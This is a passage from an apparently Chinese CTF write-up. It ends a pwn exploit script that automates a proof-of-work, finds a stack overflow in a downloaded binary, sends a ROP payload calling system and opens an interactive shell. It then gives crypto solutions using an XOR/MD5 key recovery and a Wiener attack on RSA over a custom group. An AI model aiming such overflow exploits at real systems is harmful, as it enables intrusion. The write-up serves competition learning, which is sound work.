            suffix = suffix.decode('utf-8')
        p = ['hashcat', '--potfile-disable', '--quiet', '--outfile-format', '2', '-a', '3', '-m1400', hsh.strip(), '?a?a?a?a' + suffix.strip()]
        pio = zio(p)
        x = pio.readline()
        pio.close()
        return x[:4]
    print('target = %r' % (target, ))
    io = zio(target, print_read=COLORED(RAW, 'yellow'), print_write=COLORED(RAW, 'cyan'), timeout=10000)
    if LOCAL:
        io.gdb_hint(breakpoints=[
            0x40141F,
        ])
        bin_content = open(target, 'rb').read()
        instructions, mapping, reverse_map = load_disasm('disasm.txt')
    else:
        io.read_until(b'sha256(xxxx + ')
        suffix = io.read_until(b') == ', keep=False)
        hsh = io.read_line(keep=False)
        ans = solve_pow(suffix, hsh)
        io.read_until(b'give me xxxx:')
        io.writeline(ans)
        b64 = io.read_until(b'==end==', keep=False)
        bin_content = base64.b64decode(b64.strip())
        with open('bin.tmp', 'wb') as f:
            f.write(bin_content)
        with open('bin.tmp.disasm.txt', 'w') as f:
            proc = subprocess.run(['objdump', '-M', 'intel',  '-d', './bin.tmp'], stdout=f, stderr=f)
        instructions, mapping, reverse_map = load_disasm('bin.tmp.disasm.txt')
    idx, overflow_offset, overflow_size = find_overflow()
    print(idx)
    print(instructions[idx-3])
    print(instructions[idx-2])
    print(instructions[idx-1])
    print(instructions[idx-0])
    find_path(idx)
    walk(io)
    ret = 0x401379
    system = 0x40134C
    payload = l64(ret) * ((overflow_offset // 8) + 1) + l64(ret) + l64(system)
    io.write(payload.ljust(overflow_size, b'_'))
    io.interact()
## Crypto
###  ciruit map
描述：
A valid map
Digital circuits is hard , right?
 2021dicectf原题
    import hashlib
    from Crypto.Util.number import long_to_bytes
    def xor(A, B):
        return bytes(a ^ b for a, b in zip(A, B))
    input = [
        [13675268, 8343801],
        [12870274, 10251687],
        [12490757, 6827786],
        [3391233, 2096572],
        [4567418, 15707475], 
        [3648155, 14095476], 
        [8680011, 14409690], 
        [2504390, 9376523]  #先求出的key
    ]
    xor1 = b''
    for i in input:
        tmp = sum(i)
        xor1 += bytes(long_to_bytes(tmp))
    mask = hashlib.md5(xor1).digest()
    flag = long_to_bytes(0x1661fe85c7b01b3db1d432ad3c5ac83a)
    print(xor(mask, flag))
###  cubic
nc 123.60.153.41 7002
A valid cubic
经典的自定义群运算题目，很显然这是一个有限群，所以其商群必然存在循环群。根据欧拉定理的证明可以得出，欧拉定理适用的条件是循环群，因此该题目定义的群是符合欧拉定理的。RSA也是基于欧拉定理，所以这道题和RSA的解法很像。
现在的关键问题是寻找一种方法求群上元素的阶，这是应用欧拉定理的关键数据。观察代码可以看出这个群的单位元是`(None,
None)`，我们不妨打个表来找一下规律，用下面的脚本：
    from Crypto.Util.number import *
    def add(P, Q, mod):
        x1, y1 = P
        x2, y2 = Q
        if x2 is None:
            return P
        if x1 is None:
            return Q
        if y1 is None and y2 is None:
            x = x1 * x2 % mod
            y = (x1 + x2) % mod
            return (x, y)
        if y1 is None and y2 is not None:
            x1, y1, x2, y2 = x2, y2, x1, y1
        if y2 is None:
            if (y1 + x2) % mod != 0:
                x = (x1 * x2 + 2) * inverse(y1 + x2, mod) % mod
                y = (x1 + y1 * x2) * inverse(y1 + x2, mod) % mod
                return (x, y)
            elif (x1 - y1 ** 2) % mod != 0:
                x = (x1 * x2 + 2) * inverse(x1 - y1 ** 2, mod) % mod
                return (x, None)
            else:
                return (None, None)
        else:
            if (x1 + x2 + y1 * y2) % mod != 0:
                x = (x1 * x2 + (y1 + y2) * 2) * inverse(x1 + x2 + y1 * y2, mod) % mod
                y = (y1 * x2 + x1 * y2 + 2) * inverse(x1 + x2 + y1 * y2, mod) % mod
                return (x, y)
            elif (y1 * x2 + x1 * y2 + 2) % mod != 0:
                x = (x1 * x2 + (y1 + y2) * 2) * inverse(y1 * x2 + x1 * y2 + 2, mod) % mod
                return (x, None)
            else:
                return (None, None)
    def myPower(P, a, mod):
        target = (None, None)
        t = P
        while a > 0:
            if a % 2:
                target = add(target, t, mod)
            t = add(t, t, mod)
            a >>= 1
        return target
    def genPrime(nbits):
        while True:
            a = random.getrandbits(nbits // 2)
            b = random.getrandbits(nbits // 2)
            if b % 3 == 0:
                continue
            p = a ** 2 + 3 * b ** 2
            if p.bit_length() == nbits and p % 3 == 1 and isPrime(p):
                return p
    def order(v, p):
        i = 1
        while True:
            if myPower(v, i, p) == (None, None):
                return i
            i += 1
    test = (1, 1)
    print("p\t\torder\t\tp^2\t\t\tp^3")
    for _ in range(10):
        p = genPrime(8)
        print("%d\t\t%d\t\t%d\t\t%d" % (p, order(test, p), p ** 2, p ** 3))
分析输出：
    p        order       p^2         p^3
    199        13267       39601       7880599
    199        13267       39601       7880599
    211        14911       44521       9393931
    199        13267       39601       7880599
    181        10981       32761       5929741
    163        1273        26569       4330747
    211        14911       44521       9393931
    193        12481       37249       7189057
    151        7651        22801       3442951
    241        19441       58081       13997521
发现，$p^3-1$都是order的倍数。那么完全可以当作阶来用。又因为flag不会太大，因此题目中用的模数`pad*N`完全可以用`p`或者`q`代替，这样这个题就做出来了。
exp如下：
    from math import gcd 
    import gmpy2 
    from Crypto.Util.number import inverse, long_to_bytes 
    def RSAdecompose(n, ed): 
        tmp = ed - 1 
        s = 0 
        while tmp % 2 == 0: 
            s += 1 
            tmp //= 2 
        t = tmp 
        A = 0 
        I = 0 
        find = False 
        for a in range(2, n): 
            for i in range(1, s + 1): 
                if pow(a, pow(2, i - 1) * t, n) != 1 and pow(a, pow(2, i - 1) * t, n) != n - 1 and pow(a, pow(2,i) * t, n) == 1: 
                    A = a 
                    I = i 
                    find = True 
                    break 
            if find: 
                break 
        if A == 0 and I == 0: 
            return None 
        p = gcd(pow(A, pow(2, I - 1) * t, n) - 1, n) 
        q = n // p 
        assert p * q == n 
        return (p, q) 
    def rational_to_quotients(x, y): 
        a = x // y 
        quotients = [a] 
        while a * y != x: 
            x, y = y, x - a * y 
            a = x // y 
            quotients.append(a) 
        return quotients 
    def convergents_from_quotients(quotients): 
        convergents = [(quotients[0], 1)] 
        for i in range(2, len(quotients) + 1): 
            quotients_partion = quotients[0:i] 
            denom = quotients_partion[-1]  # 分母 
            num = 1 
            for _ in range(-2, -len(quotients_partion), -1): 
                num, denom = denom, quotients_partion[_] * denom + num 
            num += denom * quotients_partion[0] 
            convergents.append((num, denom)) 
        return convergents 
    def WienerAttack(e, n): 
        quotients = rational_to_quotients(e, n) 
        convergents = convergents_from_quotients(quotients) 
        for (k, d) in convergents: 
            if k and not (e * d - 1) % k: 
                phi = (e * d - 1) // k 
                # check if (x^2 - coef * x + n = 0) has integer roots 
                coef = n - phi + 1 
                delta = coef * coef - 4 * n 
                if delta > 0 and gmpy2.iroot(delta, 2)[1] == True: 
                    return d 
    def add(P, Q, mod): 
        x1, y1 = P 
        x2, y2 = Q 
        if x2 is None: 
            return P 
        if x1 is None: 
            return Q 
        if y1 is None and y2 is None: 
            x = x1 * x2 % mod 
            y = (x1 + x2) % mod 
            return (x, y) 
        if y1 is None and y2 is not None: 
            x1, y1, x2, y2 = x2, y2, x1, y1 
        if y2 is None: 
            if (y1 + x2) % mod != 0: 
                x = (x1 * x2 + 2) * inverse(y1 + x2, mod) % mod 
                y = (x1 + y1 * x2) * inverse(y1 + x2, mod) % mod 
                return (x, y) 
            elif (x1 - y1 ** 2) % mod != 0: 
                x = (x1 * x2 + 2) * inverse(x1 - y1 ** 2, mod) % mod 
                return (x, None) 
            else: 
                return (None, None) 
        else: 
            if (x1 + x2 + y1 * y2) % mod != 0: 
                x = (x1 * x2 + (y1 + y2) * 2) * inverse(x1 + x2 + y1 * y2, mod) % mod 
                y = (y1 * x2 + x1 * y2 + 2) * inverse(x1 + x2 + y1 * y2, mod) % mod 
                return (x, y) 
            elif (y1 * x2 + x1 * y2 + 2) % mod != 0: 
                x = (x1 * x2 + (y1 + y2) * 2) * inverse(y1 * x2 + x1 * y2 + 2, mod) % mod 
                return (x, None) 
            else: 
                return (None, None) 
    def myPower(P, a, mod): 
        target = (None, None) 
        t = P 
        while a > 0: 
            if a % 2: 
                target = add(target, t, mod) 
            t = add(t, t, mod) 
            a >>= 1 
        return target 
    e = 4900663392474333511021274640586676041190209685334279465644481953732654820007817465784732552403161544491127978960528622855662226436013278818654816634231988610344582782186016441780833459265436490192924918161499546130585534712016341883862636292562878766223441301439228458011482886280440623319855294068082796058072724036574171831263278231498144433634711174601580662800543021165022020993826916028784897066067245828422668690991474561604415237342722134303009211975140707793593659250476825594367676528487883099797429162461388379576349794949052029036932537743737882862455041914136992742454025785618036422947521579196419682673 
    N = 16747204882417711556566528921331201720409686477045148358102407358649177037162364757337579737480709279957814538616282656834391036843801973604436858315398426544680221288140414500707975771367683893038710797912471910646361535977073670535351131336367114860464749825264434600778157181779675957160461431719021503108817300190687402628173857695242091154625300957259974276165473530538699640521880788598671262492360267197522031691979305758467455462308866998372462867278079383311005053482404930635325015230152289437841471244731705014411625162283665596766705850908703578792897039321331779312997615919261149792657373096116865329681 
    cipher = (1502537198037412138959404925273947125135815733714613113514320632189593377751418476234621558490959338311604744450862970281032410900602855827915451892812987364777765959947084373897245818509290955227026042711684121325311823058498537239012028561792486103281876155615838531477852906000341526557222599310995739831543658223880935572087312742332183395367851697095266248237233506401316404436470875195714876017630583057770038474875796980993028217458408971552567154328292460799613025812259659231108327829165282506352092076311191840744613851846363317595941811588179124381597704935053201484470162263659131968489028564549622533697954537751062579586560414593976837419255907900029822338445737875577148140312280440226776902211723292101877348185901719741368457958588921796200981975075293129980056841456107867653473926640266384852447661565261302935222903023606406288336953609068541701972215445007377344441511973422565646147322055069598488293931, 1011403345603727408945876921250066820314220339105409921963107559195469502064003760326598913179366575981301702956740453627420761328713409390410661289472471898555514549526488404880640921605411282791715962933303870043871446613392022087329011550301515712639691076925568594867583281055065644358838017936361812762277354217939625893846603092627092038863632584999212161084360711665335337867672785946059549908812080484214952167276959823859872433687012399699321821628902087613134849101298661182346870557214136938336080489056200804879187330910338994984002258978932867300612824944744731909867671800598959017549057154534956670423369755122935318059535865610235297367836119658331560061846307081157317985910548447143673273543728783307221862568130810339529595961095105799484367002894090836242935087629943182476006427583114853476474037533007772721440732363420948049914690375136821227018708695289507462018947270591332826564337207730588105092063) 
    padding = 105633841121800385495299323793575525757662062720618660464374134421074511358214855668399510418917564552735810735896127683524211092138747188289947813061924731524251612980721176172871908031798142300682065573614320720911139764848510512663864510199192378016664027839477108506581437250078083046615135331808942191529 
    d = WienerAttack(e, N) 
    p, q = RSAdecompose(N, e * d) 
    msg = myPower(cipher, inverse(e, (p ** 3 - 1)), p) 
    flag = long_to_bytes(msg[0]) + long_to_bytes(msg[1]) 
    print(flag)
## Rev
### **SycGame**